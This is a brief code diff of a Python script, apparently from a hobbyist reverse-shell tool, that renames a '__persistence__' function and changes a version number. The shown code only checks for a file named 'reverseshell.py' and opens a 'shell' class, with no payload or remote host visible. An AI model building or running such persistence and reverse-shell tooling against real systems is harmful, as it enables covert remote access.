@@ -10,13 +10,13 @@ import os
 #   Twitter :   @keyjeek                  #
 #   Github  :   @keyj33k                  #
 #   Insta   :   @keyjeek                  #
-#   Version :   1.0.3                     #
+#   Version :   1.0.0                     #
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # # 
 
 while True:
 
-    def __persistence__():
+    def __persistence():
         import time
         os.system('clear')
         file_exist_check = os.path.exists("reverseshell.py")
@@ -30,9 +30,9 @@ while True:
         elif file_exist_check == False:  
             pass
         else:
-            return __persistence__()
+            return __persistence()
 
-    __persistence__()
+    __persistence()
 
     class shell:
         
